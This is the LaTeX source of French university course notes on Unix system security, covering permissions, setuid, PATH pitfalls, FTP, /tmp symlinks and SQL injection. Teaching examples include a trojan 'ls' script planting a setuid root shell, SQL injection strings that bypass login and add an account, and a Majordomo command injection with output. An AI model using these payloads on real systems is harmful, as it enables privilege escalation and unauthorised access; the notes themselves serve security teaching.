@@ -1,0 +1,540 @@
+\documentclass{article}
+
+\usepackage{amsmath}
+\usepackage{amsfonts}
+\usepackage{amssymb}
+\usepackage{multicol}
+
+\usepackage{mathenv}
+
+\def\nbOne{{\mathchoice {\rm 1\mskip-4mu l} {\rm 1\mskip-4mu l}
+{\rm 1\mskip-4.5mu l} {\rm 1\mskip-5mu l}}}
+
+\usepackage{vmargin}
+\setmarginsrb{2.5cm}{2.5cm}{2.5cm}{2.5cm}{0cm}{0cm}{0cm}{0cm}
+
+\usepackage[utf8]{inputenc}
+
+\usepackage[french]{babel}
+\selectlanguage{french}
+
+\usepackage{color}
+\usepackage{graphicx}
+\graphicspath{{img/}} 
+\usepackage{listings}
+\definecolor{colKeys}{rgb}{0.75,0,0}
+\definecolor{colIdentifier}{rgb}{0,0,0}
+\definecolor{colComments}{rgb}{0.75,0.75,0}
+\definecolor{colString}{rgb}{0,0,0.7}
+
+\usepackage{verbatim}
+\usepackage{moreverb}
+
+\lstset{
+basicstyle=\ttfamily\small, %
+identifierstyle=\color{colIdentifier}, %
+keywordstyle=\color{colKeys}, %
+stringstyle=\color{colString}, %
+commentstyle=\color{colComments}, %
+showspaces=false,
+}
+\lstset{language=java}
+
+% Commandes personnelles %
+
+\definecolor{darkred}{rgb}{0.85,0,0}
+\definecolor{darkblue}{rgb}{0,0,0.7}
+\definecolor{darkgreen}{rgb}{0,0.6,0}
+\definecolor{darko}{rgb}{0.93,0.43,0}
+\definecolor{maintitle}{rgb}{0.66,0,0.22}
+\definecolor{title}{rgb}{0,0.5,0.5}
+\newcommand{\maintitlecolor}[1]{\textcolor{maintitle}{#1}}
+\newcommand{\titre}[1]{\textcolor{title}{#1}}
+\newcommand{\tsect}[1]{\titre{\section{#1}}}
+\newcommand{\tssect}[1]{\titre{\subsection{#1}}}
+\newcommand{\tsssect}[1]{\titre{\subsubsection{#1}}}
+\newcommand{\vect}[1]{\overrightarrow{#1}}
+\newcommand{\dred}[1]{\textcolor{darkred}{\textbf{#1}}}
+\newcommand{\dgre}[1]{\textcolor{darkgreen}{\textbf{#1}}}
+\newcommand{\dblu}[1]{\textcolor{darkblue}{\textbf{#1}}}
+\newcommand{\dora}[1]{\textcolor{darko}{\textbf{#1}}}
+\newcommand{\gre}[1]{\textcolor{darkgreen}{#1}}
+\newcommand{\blu}[1]{\textcolor{darkblue}{#1}}
+\newcommand{\ora}[1]{\textcolor{darko}{#1}}
+\newcommand{\red}[1]{\textcolor{darkred}{#1}}
+\newcommand{\ceil}[1]{\left\lceil #1 \right\rceil}
+\newcommand{\cdil}[1]{\left\lfloor #1 \right\rfloor}
+\newcommand{\term}[1]{\textit{\textcolor{maintitle}{#1}}}
+\newcommand{\image}[1]{\includegraphics{#1}}
+\newcommand{\imageR}[2]{\includegraphics[width=#2px]{#1}}
+\newcommand{\imageRT}[2]{\includegraphics[height=#2px]{#1}}
+\newcommand{\img}[1]{\begin{center}\includegraphics[width=400px]{#1}\end{center}}
+\newcommand{\imag}[1]{\begin{center}\includegraphics{#1}\end{center}}
+\newcommand{\imgR}[2]{\begin{center}\includegraphics[width=#2px]{#1}\end{center}}
+\newcommand{\imgRT}[2]{\begin{center}\includegraphics[height=#2px]{#1}\end{center}}
+\newcommand{\point}[2]{\item \ora{\underline{#1}} : \textit{#2}}
+\newcommand{\bfp}[2]{\item \textbf{#1} : \textit{#2}}
+\newcommand{\sumparam}[3]{\sideset{}{_{#1}^{#2}}\sum{#3}}
+\newcommand{\sumin}[3]{\sideset{}{_{i=#1}^{#2}}\sum{#3}}
+\newcommand{\sumkn}[3]{\sideset{}{_{k=#1}^{#2}}\sum{#3}}
+\newcommand{\intin}[3]{\sideset{}{_{#1}^{#2}}\int{#3}}
+\newcommand{\stitre}[1]{\noindent\textbf{\underline{#1}} \\}
+\newcommand{\R}{\mathbb{R}}
+\newcommand{\Z}{\mathbb{Z}}
+\newcommand{\N}{\mathbb{N}}
+\newcommand{\ualpha}{\vect{u_\alpha}}
+\newcommand{\valpha}{\vect{v_\alpha}}
+\newcommand{\palpha}{\vect{\Psi_\alpha}}
+\DeclareMathAlphabet{\mathpzc}{OT1}{pzc}{m}{it}
+
+\begin{sffamily}
+
+\title{$ $\\ $ $\\ $ $\\ $ $\\ $ $\\ $ $\\ $ $\\\begin{Huge}\maintitlecolor{Sécurité des systèmes 
+informatiques}\end{Huge} \\ 
+	   $ $ \\ \begin{LARGE}\textit{Notes de cours}\end{LARGE}}
+\author{\textit{Xavier Dubuc} \\ \blu{Xavier.DUBUC@student.umons.ac.be} \\ $ $\\ $ $\\ $ $\\ $ $\\ $ $\\ $ $\\ $ $\\ $ 
+$ \\ 
+\includegraphics{UMONS.jpg}}
+\date{}
+\end{sffamily}
+
+\begin{document}\begin{sffamily}
+
+\maketitle
+
+\newpage
+
+\tableofcontents
+
+\hbox{\raisebox{0.4em}{\vrule depth 0.4pt height 0.4pt width 10cm}}
+
+\newpage
+
+\tsect{Préambule}
+
+L'examen ne comporte aucune contrainte vestimentaire \textit{(le professeur n'en ayant cure, s'habillant lui aussi un 
+peu comme il le désire)}. Les slides du cours sont disponibles sur \textbf{e-learning} (d'autres fichiers sont 
+disponibles mais ils ne sont là que si cela interesse les élèves, ils sont purement informatifs et ne font donc pas 
+partie de la matière d'examen).
+
+\tsect{Introduction}
+
+Avant à l'\textbf{UMH}, on utilisait \textit{AIX}, distribution spéciale de \textit{Unix} utilisée par \textbf{IBM} et 
+on désirait n'utiliser que des programmes \textit{«Open source»} et on utilisait que très peu de logiciels 
+propriétaires. L'idée qui guidait l'\textbf{UMH} était de passer d'\textit{AIX} à \textit{Linux} («Se débarasser 
+d'\textbf{IBM}»). À la \textbf{Polytech}, ils possédaient également \textit{Unix} au début mais par la suite ils sont 
+passés à \textbf{Microsoft} \textit{(avec des serveurs \textbf{Microsoft Exchange} pour tout ce qui est mail)}. 
+L'\gre{avantage} principal de l'\textbf{open source} est que si l'on découvre une faille de sécurité dans le logiciel 
+utilisé, on peut la corriger nous-même.
+
+\tsect{Bases de Unix, point de vue sécurité}
+
+\noindent La commande \textit{ls -ail} fournit tout un ensemble d'informations sur les fichiers, voici un exemple de 
+résultat de son exécution : \\
+\begin{center}\begin{boxedverbatim}
+xavier@Sephiroth:~/Bureau$ ls -ail
+total 8
+1308173 drwxr-xr-x  2 xavier xavier 4096 2010-09-01 17:18 .
+1308162 drwxr-xr-x 40 xavier xavier 4096 2010-09-19 14:42 ..
+1308442 lrwxrwxrwx  1 xavier xavier   22 2010-05-22 03:16 7even -> /media/OS/Users/Xavier
+\end{boxedverbatim}$
+\end{center}
+
+\renewcommand{\labelitemii}{$\rightarrow$}
+
+\begin{itemize}
+\item la première lettre décrit le type de fichier, 
+	\begin{itemize}
+	\item \term{d} désigne un dossier,
+	\item \term{-} désigne un fichier,
+	\item \term{l} désigne un lien symbolique.
+	\end{itemize}
+\item les trois lettres qui suivent désignent les droits de l'\term{user},
+\item les trois suivantes les droits du \term{groupe},
+\item les trois dernières les droits des \textit{"\term{other}"},
+\item \begin{itemize}
+		\item \term{r} désigne le droit à la \term{lecture}, \term{-} désigne l'absence de ce droit. Dans le cas d'un
+		répertoire, il s'agit de pouvoir voir ce que contient le répertoire.
+		\item \term{w} désigne le droit à l'\term{écriture}, \term{-} désigne l'absence de ce droit. Dans le cas d'un
+		répertoire, il s'agit de pouvoir créer/supprimer un fichier dans le répertoire.
+		\item \term{x} désigne le droit à l'\term{exécution}, \term{-} désigne l'absence de ce droit. Dans le cas d'un
+		répertoire, il s'agit de pouvoir se placer à l'intérieur de ce répertoire.
+		\item \term{s} à la place du droit d'exécution pour \term{user} désigne le placement de l'\term{UID Bit},
+		\item \term{g} à la place du droit d'exécution pour le \term{groupe} désigne le placement du \term{GID Bit},
+		\item \term{t} à la place du droit d'exécution pour \textit{"\term{other}"} désigne le placement du 
+		\term{Sticky Bit}.
+	  \end{itemize}
+\end{itemize}
+
+\begin{itemize}
+\item Les terme \term{owner} et \term{user} désignent une seule et même personne, il s'agit du \term{possesseur} du 
+fichier concerné.
+\item Le terme \term{groupe} désigne un groupe dont on a spécifié les droits d'accès (le \term{possesseur} du 
+fichier ne fait pas spécialement partie de ce groupe, il se peut également qu'il fasse partie de plusieurs groupes). 
+\item Le terme \term{other} désigne tout autre utilisateur ayant un accès au serveur, c'est-à-dire qu'il faut qu'il ait 
+au moins accès à un \textit{shell}, un accès \textbf{FTP}, ou autre, il a donc besoin d'un login et d'un mot de passe 
+ce qui implique que ces personnes ne sont pas non plus n'importe qui.
+\end{itemize}
+
+\newpage
+
+\titre{\subsection{Set UID/GID bit/Sticky bit}}
+
+Un exemple d'utilisation concret de l'\term{UID bit} est le cas où l'utilisateur désire changer son mot de passe, il 
+lui faut alors le droit en écriture dans le fichier. Si on inscrit \term{w} pour tout le monde pour résoudre ce 
+problème, ça en crée un autre, chaque utilisateur du serveur pourra modifier le mot de passe de tout le monde. On place 
+alors le \term{UID bit} ce qui permet d'être considéré comme le \term{possesseur} du fichier dans le contexte de 
+l'exécution de la commande. \\
+
+Pour le \term{Sticky bit}, l'exemple le plus concret est le dossier \textit{/tmp}, qui contient les fichiers 
+temporaires créés par les applications lancées par tout utilisateur connecté au serveur. Le fait de placer le 
+\term{Sticky bit} permet de conserver la trace du créateur du fichier \textit{(pour que l'administrateur puisse se 
+rendre compte si une application lancée par un utilisateur créé énormément de fichiers temporaires, par exemple)}. \\
+
+Il faut éviter le plus possible l'utilisation de l'\term{UID bit} car c'est assez dangereux, par exemple si l'on 
+modifie le contenu de la commande \textit{passwd}, vu qu'elle appartient à \term{root} et que l'\term{UID bit} est 
+placé, lors de l'exécution de cette commande, on est \term{root} ! \textit{(On peut donc placer les commandes que l'on 
+veut dans le fichier de la commande \textit{passwd} et les exécuter en tant que \term{root})}
+
+\titre{\subsection{chown/chmod et applications}}
+
+Le \term{root} \textit{(= administrateur)} est capable de modifier les \term{possesseurs} du fichiers (le \term{groupe} 
+ainsi que l'\term{user}) via la commande \textit{chown} ainsi que les droits de chacun (y compris 
+\textit{"\term{other}"}) via la commande \textit{chmod}. Encore une fois, l'\term{user} possesseur du fichier 
+n'appartient par forcément au \term{groupe} possesseur de ce même fichier, ainsi, on peut imaginer l'exemple suivant : 
+les commandes nécéssaires à la gestion de ma boite mail doivent absolument avoir accès en écriture/lecture à ma boite 
+de réception (mais les autres utilisateurs ne doivent pas l'avoir !). On crée alors un groupe \textit{"mail"} qui va 
+être placé comme \term{possesseur} de toutes les commandes nécéssaires au bon fonctionnement de l'application mail et 
+on accorde les droits de lecture et écriture à ce groupe.
+
+\titre{\subsection{Permissions et umask}}
+
+\noindent Les permissions peuvent être également exprimées de manière numérique \textit{(pas important)} :
+\begin{itemize}
+\item $x=1$
+\item $w=2$
+\item $r=4$
+\end{itemize}
+
+\noindent L'\term{umask} permet quant à lui de spécifier les droits attitrés par défaut aux fichiers créés, la notation 
+est contraire à celle des permissions de fichier, ainsi $7$ signifie \textit{"aucun droit"}.\\ \textit{(Par défaut, les 
+fichiers ne sont pas éxécutables mais les répertoires le sont)}
+
+\titre{\subsection{Mots de passe}}
+
+Dans le fichier \textit{etc/passwd}, il y a des lignes du style : \\
+\begin{center}\begin{boxedverbatim}buys:!:10001:1001:Alain Buys:/u/cci0100/buys:/bin/tcsh\end{boxedverbatim}
+\end{center}
+
+Avant, à la place du \term{!} était placé le mot de passe (crypté), si on place "*" à la place de ce "!", le compte 
+devient inutilisable.
+
+\titre{\subsection{su/sudo}}
+
+La différence entre les deux est minime mais existe, dans le cas de \term{sudo}, il ne fonctionne que si l'utilisateur
+l'utilisant est répertorié comme utilisateur pouvant devenir \term{root} mais lors de l'utilisation de cette commande, 
+le mot de passe demandé est celui du compte de l'utilisateur (aucun mot de passe pour le compte \term{root}). Tandis 
+que pour \term{su} il s'agit de s'identifier en tant que \term{root} avec le mot de passe du compte \term{root}.
+
+\newpage
+
+\titre{\subsection{Commandes dangereuses}}
+
+Exemple vécu, l'administrateur désirait vérifier que la commande \term{sh} se trouvait bien dans \textit{/usr/bin} et 
+il a utilisé la commande suivante : \\
+
+\begin{center}
+	\begin{boxedverbatim}ls -al | grep sh \end{boxedverbatim}
+\end{center}
+
+suite à l'utilisation de cette commande, plus aucune commande n'était utilisable.
+La raison à cela est que chaque ligne du listing effectué par la commande \textit{ls -al} est du style 
+\textit{"drwxr... machin"} qui est passé à \textit{"grep sh"} qui en fait donne simplement \textit{"sh"} ce qui fait 
+que la ligne passée est exécutée. Pour ces lignes là il n'y a pas de problème car la commande sera inconnue 
+\textbf{mais} dans le répertoire \textbf{/usr/bin}, il y a beaucoup de lien symbolique dont la syntaxe dans le listing
+est la suivante : 
+
+\begin{center}
+	\begin{boxedverbatim}1308442 lrwxrwxrwx 1 xavier xavier 22 2010-05-22 03:16 ls -> /media/OS/cmd/ls
+	\end{boxedverbatim}
+\end{center}
+
+Le \term{$>$} va envoyer toute la commande qui précède (et donc commande inconnue) dans le fichier qui suit, sachant 
+que dans ce dossier il y a des liens symboliques pour les commandes qui pointent vers les vrais fichiers binaires des 
+commandes, on va en fait modifier tous les fichiers binaires des commandes en y plaçant une commande inconnue, 
+autrement dit on va remettre à 0 toutes les commandes ! \\
+
+Il est donc fortement conseiller de \textbf{tester} une commande avant de l'effectuer, par exemple la commande suivante 
+: \begin{center}
+	\begin{boxedverbatim}ps -ef | grep imapd | grep Feb | awk ’{print "kill "$2}’ | sh
+	\end{boxedverbatim}$
+\end{center} va supprimer toutes les sessions \term{imap} \textit{(mail)} qui sont lancées depuis février et qui ne
+servent plus à rien. Tout ce qui précède le pipe ($\mid$) n'est qu'une impression de lignes "kill PID", onpeut 
+donc envoyer tout ça à la commande \textbf{echo} afin d'afficher ce qui va \^{e}tre exécuté par \textbf{sh}.
+
+\tssect{La variable path}
+
+La variable \term{path} contient toutes les commandes que le système admet, ainsi, si on a une commande du genre : 
+\begin{center}
+	\begin{boxedverbatim}
+	/usr/tivoli/ ... /dsmc
+	\end{boxedverbatim}
+\end{center}
+si on tape simplement \textbf{dsmc} dans le \textit{shell}, \textit{"Commande inconnue"} apparaîtra. Une solution à ça, 
+qui était utilisée par les travailleurs d'\textbf{IBM}, est d'ajouter le répertoire courant dans le \term{path}. Pour 
+ce faire, on peut placer le répertoire à la fin ou au début, chacune de ces 2 façons engendrant des \red{problèmes} :
+\begin{itemize}
+\item \textbf{devant}, on réalise cet ajout avec la commande \textit{(en csh)}: 
+\begin{center}
+	\begin{boxedverbatim}
+	set path = (. $path)
+	\end{boxedverbatim}$
+\end{center}
+imaginons qu'il y ait un script dans ce dossier avec le nom de \textbf{ls}, le script sera exécuté à la place ! Un 
+utilisateur pourrait dire à l'administrateur qu'il n'arrive pas à supprimer un fichier, celui-ci va dans ce dossier et 
+effectue un \textbf{ls} pensant lister le contenu alors qu'il va exécuter le script :
+\begin{center}
+	\begin{boxedverbatim}
+	cd ~user
+	ls
+	\end{boxedverbatim}
+\end{center}
+Jusque là rien de bien grave, mais imaginons que ce script soit "transparent" dans le sens qu'il va effectuer le ls 
+quoiqu'il arrive mais également d'autres instructions, par exemple : 
+\begin{center}
+	\begin{boxedverbatim}
+	#!/bin/csh
+	cp -p /usr/bin/tcsh /tmp/myshell
+	chmod +s /tmp/myshell
+	/usr/bin/ls $1
+	\end{boxedverbatim}$
+\end{center}
+Ce script va copier le shell (dont le possesseur est \textbf{root}) dans le répertoire \textbf{tmp} et y placer le 
+\term{set UID bit}, rendant ainsi un shell accessible en root !
+\newpage
+\item \textbf{derrière}, on réalise cet ajout avec la commande \textit{(en csh)}: 
+\begin{center}
+	\begin{boxedverbatim}
+	set path = ($path .)
+	\end{boxedverbatim}$
+\end{center}
+c'est moins évident ici, imaginons qu'un script se nomme \textbf{sl} et que l'administrateur fait une faute de frappe 
+et tape \textbf{sl} au lieu de \textbf{ls}, au lieu de voir apparaître \textit{"Commande inconnue"}, il exécutera un 
+script créé par l'utilisateur, qui peut contenir n'importe quoi, comme le script ci-haut !
+\begin{center}
+	\begin{boxedverbatim}
+	cd /tmp
+	sl
+	\end{boxedverbatim}
+\end{center}
+\end{itemize}
+
+On peut ainsi résumer ce cas à \term{2 erreurs}, la première est l'ajout de \term{.} dans la variable \term{path} et la 
+seconde est que l'administrateur n'a aucun besoin de se déplacer dans le dossier de l'utilisateur pour lister ce qu'il 
+contient, il peut très bien taper :
+\begin{center}
+	\begin{boxedverbatim}
+	ls ~user
+	\end{boxedverbatim}
+\end{center}
+
+Il faut également rappeller que si il y a un fichier exécutable dans le dossier courrant du nom de \textbf{ls}, si on 
+tape \textbf{ls} dans le terminal, c'est la commande \textbf{ls} de \term{/usr/bin} qui sera exécutée et pas le 
+fichier. Les utilisateurs ont tendance à croire que pour lancer la commande, si elle n'est pas dans \term{path}, il 
+faut taper tout le chemin vers cette commande alors qu'il suffit de taper \textit{./ls} lorsque l'on est dans le 
+dossier de cette commande.
+
+\tssect{Contenu d'un dossier}
+
+Dans les comptes de l'université, chaque utilisateur possède un fichier .login, .tcshrc, .profile, .. il y en a 
+beaucoup comme ça. On peut trouver ça lassant d'effectuer les commandes suivantes pour chaque fichier cité précédemment 
+:
+\begin{center}
+	\begin{boxedverbatim}
+	cp -p /etc/umh/profiles/.login ~user/
+	chown user.group ~user/.login
+	\end{boxedverbatim}
+\end{center}
+
+On se dit alors que l'on va utiliser la commande suivante pour tout faire en une fois : 
+\begin{center}
+	\begin{boxedverbatim}
+	chown -R user.group ~user/
+	\end{boxedverbatim}
+\end{center}
+
+ce qui est une \term{grosse erreur}, en effet, que peut contenir le dossier ? Il se pourrait qu'il contienne un 
+\term{lien symbolique} du type \red{sendmail $\rightarrow$ /usr/local/bin/sendmail}, la commande \textbf{chown} suivant
+les \term{liens symboliques}, elle va modifier la commande \textbf{sendmail} utilisée par tout le monde en plaçant 
+l'utilisateur comme possesseur de celle-ci. Résultat, la commande ne fonctionne plus pour personne, plus personne ne 
+peut envoyer de mail ! \\
+
+\noindent\underline{Remarque} : \textit{chown -Rh user.group $\sim$user/} permet de ne pas suivre les liens 
+symboliques.
+
+\tssect{Access List}
+
+Ces listes permettent de raffiner les droits d'accès à un fichier, elles permettent par exemple d'accorder le droit 
+d'écriture à certaines personnes d'un groupe mais pas à toutes, ou qu'un serveur web puisse avoir accès à un fichier où
+incrémenter un compteur pour le nombre de visites.
+
+\tsect{Vulnérabilités dans les applications}
+
+Il s'agit ici de voir plusieurs cas où les applications ont fait preuve de failles menant à un problème de sécurité. 
+Lorsque l'on place un ordinateur, il faut se poser les bonnes questions, c'est-à-dire qu'il faut se demander si on a 
+besoin réellement d'un réseau, si on peut pas travailler avec des graveurs, disques externes ou autres pour transvaser 
+les données (si ce n'est pas de manière continue). On peut aussi se demander si le réseau doit être public ou privé, si 
+l'ordinateur concerné doit être visible de l'extérieur.
+
+\tssect{Ping de la mort}
+
+Le \term{ping} était défini pour envoyer/recevoir des paquets de \term{64 bytes} mais \textbf{Windows} permettait 
+d'envoyer des paquets de données plus grands ce qui provoquait un \term{Denial of Service} et les 2 \textbf{OS} 
+plantaient.
+
+\newpage
+\tssect{FTP Anonyme}
+
+Le fait de mettre l'upload en anonyme est dangereux, en effet on peut retrouver des fichiers illégaux \textit{(genre 
+des films et tout ça)} et on peut avoir accès à des fichiers du genre \textit{.rhosts}. L'architecture des serveurs 
+\term{FTP} en général est de placer les fichiers dans \textbf{/pub}, dossier où juste \term{root} peut écrire 
+\textit{(on va créer des sous-répertoires pour chaque utilisateur ou groupe)}. Lorsque l'on fait du \term{FTP non-
+anonyme}, le compte \textbf{ftp} ne peut écrire nulle-part mais les sous-traitants peuvent créer des fichiers/dossiers 
+avec la permission \textbf{777} (et donc le compte \textbf{ftp} peut y écrire !). \\
+
+\noindent\textbf{\underline{Question d'examen} :} on souhaite envoyer les fichiers \textbf{pdf} avant une conférence 
+regroupant plusieurs exposés mais ils sont trop gros pour être envoyés par mail et le \term{ftp} n'est pas destiné aux 
+gens extérieurs. Comment faire ? L'idée est de créer le dossier \textit{ftp/incoming} tel que tout le monde peut y 
+écrire mais pas lire, ainsi on peut uploader mais personne ne peut voir ce qui est uploadé sauf root. Il faut cependant 
+faire gaffe, vu que l'on a accès en écriture, on peut créer un sous répertoire d'\textit{incoming} et je lui mets les
+protections que je veux, il suffit dès lors que j'upload mes fichiers dans ce dossier et tout le monde peut les voir.
+
+\tssect{Serveur Web}
+
+Le problème évoqué avec \term{httpd} qui tourne sous root et qu'il n'y a pas de \term{shadow file} peut être résolu en 
+utilisant un \term{shadow file} \textbf{bien utilisé}, c'est-à-dire que le fichier \textit{/etc/passwd} contient 
+\textbf{"!"} à la place du mot de passe de l'utilisateur pour que le \term{shadow file} soit interrogé. On pourrait 
+aussi supprimer l'accès root mais ce n'est pas possible car si on veut par exemple utiliser la connexion sécurisée 
+\term{HTTPS}, celle-ci fonctionne avec du \textbf{SSL} et on a donc besoin de certificats pour attester que le site 
+utilisé est bien le bon site. Ces certificats sont accessibles que par root, d'où la nécessité de l'accès root au 
+serveur. \\
+
+\noindent Quant à la protection des fichiers sur un serveur web, le fait d'autoriser la lecture à tout le monde n'est 
+pas une bonne idée car il peut y avoir des codes php qui accèdent à la base de données et ces fichiers contiennent donc 
+le mot de passe et le login du serveur. Il se peut alors que le fichier ne soit pas exécuté par le serveur mais que 
+celui-ci affiche simplement le contenu du fichier (on peut par exemple trouver des fichiers \textbf{.php$\sim$}, 
+fichiers backups qui ne seront probablement pas exécutés).
+
+\tssect{/tmp}
+
+Les applications suivent-elles les liens symboliques dans le répertoire \textit{/tmp} ? Si c'est le cas, il 
+faut être conscient qu'une application lancée avec les droits de \textbf{root} peut amener à supprimer un fichier se 
+trouvant ailleurs sur le disque (imaginons un lien symbolique \textit{"sss"} pointant vers \textit{/usr/bin/ls}, si on 
+utilise une application du type rm sur le fichier et qu'il suit le lien symbolique ... Ou simplement une application 
+permettant d'écrire dans un fichier, ce qui remplacerait le contenu du binaire !) Il est donc de bonne pratique de 
+coder les applications de manière à ce qu'elles ne suivent pas les liens symboliques. 
+
+\tssect{Injection SQL}
+
+Il s'agit ici d'entrer du code \term{SQL} à la place d'un identifiant demandé par une application, imaginons que 
+l'application exécute le code suivant avec les données entrées par l'utilisateur : 
+
+\begin{center}
+	\begin{boxedverbatim}
+	SELECT count(*) FROM emp
+	WHERE emp.ename=’<input_ename>’ AND emp.pwd = password(’<input_pwd>’);
+	\end{boxedverbatim}
+\end{center}
+
+Imaginons maintenant que l'utilisateur entre comme \textit{’$<$input\_ename$>$’} : \textbf{"bob’;- -"}, le code 
+\term{SQL} devient :
+
+\begin{center}
+	\begin{boxedverbatim}
+	SELECT count(*) FROM emp
+	WHERE emp.ename=’bob’;-- AND emp.pwd = password(’<input_pwd>’);
+	\end{boxedverbatim}
+\end{center}
+
+\newpage
+
+Les 2 - ont pour effet de commenter la fin de la requête ce qui veut dire que le mot de passe ne sera pas vérifié ! 
+Pire encore, si l'utilisateur connait un peu l'architecture de la base de données (il pourrait de toute façon la 
+connaître en tapant comment nom d'utilisateur \textbf{bob’; show tables; - -}) il pourrait entrer quelque chose comme :
+\begin{center}\textbf{bob’; INSERT INTO emp VALUES (’jef’, password(’bingo’));- -} \end{center}
+ajoutant ainsi carrément un compte permettant d'accéder à la base de données !
+
+La solution à cette faille est de traiter chaque chaîne de caractères de sorte que ces caractères spéciaux soit 
+considérés comme de simples caractères, dans le premier exemple, on considèrera toute la chaîne de caractères 
+(\textbf{"bob$\backslash$’;- -"}) comme nom d'utilisateur.
+
+\tssect{Buffer overflow}
+
+Il s'agit ici d'erreurs dues au fait que l'on accède à des zones mémoires qui ne sont pas allouées au 
+programme que l'on a écrit, elles peuvent être sans conséquences mais peuvent également être critiques (écrans bleus, 
+...). Si l'erreur est commise à cause d'un des paramètres du programme, c'est d'autant plus grave car
+un utilisateur connaissant bien le système d'exploitation pourrait introduire un code d'attaque comme paramètre.
+
+\tssect{Majordomo}
+
+\begin{center}
+	\begin{boxedverbatim}
+bash-2.02$ /usr/local/majordomo/wrapper resend ’@|cp /bin/ksh
+/tmp/xnec;chmod 6555 /tmp/xnec’
+resend: must specify ’-l list’ at /usr/local/majordomo/resend line 77.
+bash-2.02$ ls -la /tmp/xnec
+-r-sr-sr-x 1 owner daemon 361688 Dec 29 06:26 /tmp/xnec
+	\end{boxedverbatim}
+\end{center}
+
+L'idée est que de cette manière il y a moyen de copier le fichier du \textbf{shell} en y mettant le \term{Set UID Bit}
+dans le répertoire \textit{tmp} de manière simple, même si la commande retourne une erreur, le ls qui suit permet de
+confirmer que le fichier a bien été créer. Comme la commande wrapper est placée avec un \term{set UIB Bit} et 
+appartient à \textbf{root}, le fichier créé appartient également à \textbf{root} ; l'utilisateur possède alors un 
+shell exécuté en tant que \textbf{root}. Décortiquons la commande :
+\begin{itemize}
+\item le \term{resend} est présent à cause de la présence de listes modérées, en fait ces listes sont des listes de 
+mails mais une personne reçoit d'abord le mail et doit confirmer que le mail doit être envoyé à toutes les personnes de 
+la liste en envoyant le mail à la liste \textit{(mais de cette manière il va de nouveau recevoir le mail avant tout le 
+monde...)}. La solution à ça est alors d'implémenter une seconde liste, non modérée, dont le nom est secret et on 
+envoie alors le mail à cette liste là, c'est exactement ce que permet l'option \term{resend}, elle va aller voir la 
+seconde liste dont le nom est secret pour envoyer les mails.
+\item la commande \term{wrapper} doit absolument avoir les accès \textbf{root} car elle doit envoyer les mails au 
+final, et a donc besoin d'utiliser sendmail etc, d'où le \term{set UID Bit}.
+\item l'\term{@} permet de dire qu'il faut aller lire dans le fichier qui suit les données qui s'y trouvent, l'idée est 
+ici est purement sécuritaire, si on écrit dans un fichier la liste des personnes de la liste de mails, tout le monde 
+peut la lire avec une simple commande permettant de lister la commande effectuée lorsque l'on fait appel à une liste de 
+mails. Or ici ce que verra l'utilisateur c'est que la liste est lue à partir d'un certain fichier, fichier qui ne sera 
+évidemment pas accessible à celui-ci.
+\item l'\term{$|$} spécifie simplement qu'il s'agit d'une commande et qu'il doit l'exécuter.
+\end{itemize}
+
+\noindent Dans la version suivante, ils ont arrangé le problème, cependant il est toujours possible d'exécuter des 
+commandes en tant que \textbf{majordomo} ou \textbf{daemon} \textit{(c'est-à-dire comme gestionnaire des différentes 
+listes de mails)}.
+
+\newpage
+
+\tssect{Sendmail \& mailq}
+
+La commande \term{mailq} possède un set-uid bit et appartient à \textit{root}, elle peut donc être exécutée par tout 
+le monde avec les droits de \textit{root}. Chaque mail possède un \term{Q-ID}, et pour chaque mail il existe 2 
+fichiers \textit{(par exemple \textbf{MAA06794})}:
+\begin{enumerate}
+\item \textbf{qfMAA06794} qui contient les infos sur l'expéditeur du message, le récepteur, .. l'entête,
+\item \textbf{afMAA06794} qui contient le corps du message.
+\end{enumerate}
+
+Par la suite, une nouvelle version est sortie, version qui apporte plus de confidentialité car tout le monde ne peut 
+plus exécuter \textbf{mailq} et donc tout le monde ne voit plus qui envoie quoi.\\
+
+\noindent\textit{(Petite parenthèse, par défaut sous Linux, à la création d'un utilisateur $\rightarrow$ un groupe du 
+même nom est créé.)} \\
+
+Il faut faire attention quand on modifie les droits des fichiers \textbf{sendmail}, si on modifie pas dans le fichier
+de configuration, lors d'un reboot du serveur, tout est remis à l'état initial. \\
+
+Avec le scan antivirus des mails, il faut également couvrir l'ordinateur avec un anti-virus car il peut y avoir 
+d'autres applications comportant des failles.
+
+\end{sffamily}\end{document}
